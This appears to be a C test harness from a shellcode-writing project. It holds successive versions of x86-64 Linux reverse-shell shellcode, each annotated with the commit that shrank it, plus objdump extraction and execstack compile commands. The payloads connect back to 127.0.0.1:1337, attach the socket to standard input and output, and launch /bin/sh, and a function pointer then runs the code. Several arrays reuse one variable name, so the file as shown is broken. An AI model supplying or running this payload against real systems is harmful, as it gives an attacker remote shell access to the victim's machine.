// get shell with:
//
// objdump -d asmtests/reverseshell | grep '[0-9a-f]:' | cut -f2 -d: | cut -f1-7 -d ' ' | head -n -3 | paste -d '' -s | sed 's/\t/ /g' | tr -s ' ' | sed 's/\ /\\x/g'
//
// compile with:
//
// gcc -fno-stack-protector -z execstack -o testshell testshell.c
//
int main(){
    // before removal of 0 bytes, see commit 8ea1a35 for change
    const char first_shellcode[142] = "\xbb\x02\x00\x00\x00\xb9\x01\x00\x00\x00\xba\x06"
    "\x00\x00\x00\xb8\x67\x01\x00\x00\xcd\x80\x49\x89\xc5\xb8\x00\x00\x00\x00\x50"
    "\x48\xb8\x02\x00\x05\x39\x7f\x00\x00\x01\x50\xb8\x2a\x00\x00\x00\x4c\x89\xef"
    "\x48\x89\xe6\xba\x10\x00\x00\x00\x0f\x05\xb8\x3f\x00\x00\x00\x4c\x89\xeb\xb9"
    "\x00\x00\x00\x00\xcd\x80\xb8\x3f\x00\x00\x00\x4c\x89\xeb\xb9\x01\x00\x00\x00"
    "\xcd\x80\xb8\x3f\x00\x00\x00\x4c\x89\xeb\xb9\x02\x00\x00\x00\xcd\x80\xb8\x68"
    "\x00\x00\x00\x50\x48\xb8\x2f\x62\x69\x6e\x2f\x62\x61\x73\x50\xb8\x3b\x00\x00"
    "\x00\x48\x89\xe7\xbe\x00\x00\x00\x00\xba\x00\x00\x00\x00\x0f\x05";

    // before dup2 loop, see commit 7cd1786 for change
    const char old_shellcode[112] = "\x48\x31\xc0\x48\x31\xdb\x48\x31\xc9\x48\x31\xd2"
    "\xb3\x02\xb1\x01\xb2\x06\x66\xb8\x67\x01\xcd\x80\x49\x89\xc5\x48\xb8\x02\x00"
    "\x05\x39\x7f\x00\x00\x01\x50\x48\x31\xc0\xb0\x2a\x4c\x89\xef\x48\x89\xe6\xb2"
    "\x10\x0f\x05\xb0\x3f\x4c\x89\xeb\x48\x31\xc9\xcd\x80\xb0\x3f\x4c\x89\xeb\xb1"
    "\x01\xcd\x80\xb0\x3f\x4c\x89\xeb\xb1\x02\xcd\x80\xb0\x68\x66\x50\x48\xb8\x2f"
    "\x62\x69\x6e\x2f\x62\x61\x73\x50\x48\x31\xc0\xb0\x3b\x48\x89\xe7\x48\x31\xf6"
    "\x48\x31\xd2\x0f\x05";

    // before register reusal, see commit 64bf4e1 for change
    const char old2_shellcode[103] = "\x48\x31\xc0\x48\x31\xdb\x48\x31\xc9\x48\x31\xd2"
    "\xb3\x02\xb1\x01\xb2\x06\x66\xb8\x67\x01\xcd\x80\x49\x89\xc5\x48\xb8\x02\x00"
    "\x05\x39\x7f\x00\x00\x01\x50\x48\x31\xc0\xb0\x2a\x4c\x89\xef\x48\x89\xe6\xb2"
    "\x10\x0f\x05\x48\x31\xc9\x4c\x89\xeb\xb0\x3f\xcd\x80\x80\xf9\x03\x74\x04\xfe"
    "\xc1\xeb\xf3\xb0\x68\x66\x50\x48\xb8\x2f\x62\x69\x6e\x2f\x62\x61\x73\x50\x48"
    "\x31\xc0\xb0\x3b\x48\x89\xe7\x48\x31\xf6\x48\x31\xd2\x0f\x05";

    // before push directly and save a xor, see commit 4dfafe2 for change
    const char shellcode[97] = "\x48\x31\xc0\x48\x31\xdb\x48\x31\xc9\x48\x31\xd2"
    "\xb3\x02\xb1\x01\xb2\x06\x66\xb8\x67\x01\xcd\x80\x48\x89\xc7\x48\xb8\x02\x00"
    "\x05\x39\x7f\x00\x00\x01\x50\x48\x31\xc0\xb0\x2a\x48\x89\xe6\xb2\x10\x0f\x05"
    "\x48\x31\xc9\x48\x89\xfb\xb0\x3f\xcd\x80\x80\xf9\x03\x74\x04\xfe\xc1\xeb\xf3"
    "\xb0\x68\x66\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x62\x61\x73\x53\xb0\x3b\x48\x89"
    "\xe7\x48\x31\xf6\x48\x31\xd2\x0f\x05";

    // before dup2 jmp improvment, see commit 69f9dde
    const char shellcode[92] = "\x48\x31\xc0\x48\x31\xdb\x48\x31\xc9\x48\x31\xd2"
    "\xb3\x02\xb1\x01\xb2\x06\x66\xb8\x67\x01\xcd\x80\x48\x89\xc7\x48\xbb\x02\x00"
    "\x05\x39\x7f\x00\x00\x01\x53\xb0\x2a\x48\x89\xe6\xb2\x10\x0f\x05\x48\x31\xc9"
    "\x48\x89\xfb\xb0\x3f\xcd\x80\x80\xf9\x03\x74\x04\xfe\xc1\xeb\xf3\x6a\x68\x48"
    "\xbb\x2f\x62\x69\x6e\x2f\x62\x61\x73\x53\xb0\x3b\x48\x89\xe7\x48\x31\xf6\x48"
    "\x31\xd2\x0f\x05";

    // before xor and mov got replaced by push/pop, see commit a2a57f9
    const char shellcode[89] = "\x48\x31\xc0\x48\x31\xdb\x48\x31\xc9\x48\x31\xd2"
    "\xb3\x02\xb1\x01\xb2\x06\x66\xb8\x67\x01\xcd\x80\x48\x89\xc7\x48\xbb\x02\x00"
    "\x05\x39\x7f\x00\x00\x01\x53\xb0\x2a\x48\x89\xe6\xb2\x10\x0f\x05\x48\x31\xc9"
    "\x51\x48\x89\xfb\xb0\x3f\xcd\x80\xfe\xc1\x80\xf9\x03\x75\xf2\x48\xbb\x2f\x2f"
    "\x62\x69\x6e\x2f\x73\x68\x53\xb0\x3b\x48\x89\xe7\x48\x31\xf6\x48\x31\xd2\x0f"
    "\x05";

    // before inc cmp jnz got replaced by loop, see commit 9e128c8
    const char shellcode[80] = "\x48\x31\xc0\x50\x5a\x52\x66\xff\xc0\x66\x3d\x67"
    "\x01\x75\xf6\x5b\x59\xb3\x02\xb1\x01\xb2\x06\xcd\x80\x50\x5f\x48\xbb\x02\x00"
    "\x05\x39\x7f\x00\x00\x01\x53\xb0\x2a\x54\x5e\xb2\x10\x0f\x05\x59\x59\x57\x5b"
    "\xb0\x3f\xcd\x80\xfe\xc1\x80\xf9\x03\x75\xf3\x5e\x5a\x48\xbb\x2f\x2f\x62\x69"
    "\x6e\x2f\x73\x68\x53\xb0\x3b\x54\x5f\x0f\x05";

    const char shellcode[78] = "\x48\x31\xd2\x04\x30\x50\x59\x52\xe2\xfd\x5b\xb3"
    "\x02\xb1\x01\xb2\x06\x66\xb8\x67\x01\xcd\x80\x50\x5f\x48\xbb\x02\x00\x05\x39"
    "\x7f\x00\x00\x01\x53\xb0\x2a\x54\x5e\xb2\x10\x0f\x05\x59\x59\x57\x5b\xb0\x3f"
    "\xcd\x80\xfe\xc1\x80\xf9\x03\x75\xf3\x5e\x5a\x48\xbb\x2f\x2f\x62\x69\x6e\x2f"
    "\x73\x68\x53\xb0\x3b\x54\x5f\x0f\x05";

    int (*ret)() = (int(*)())shellcode; ret();

    return 0;
}
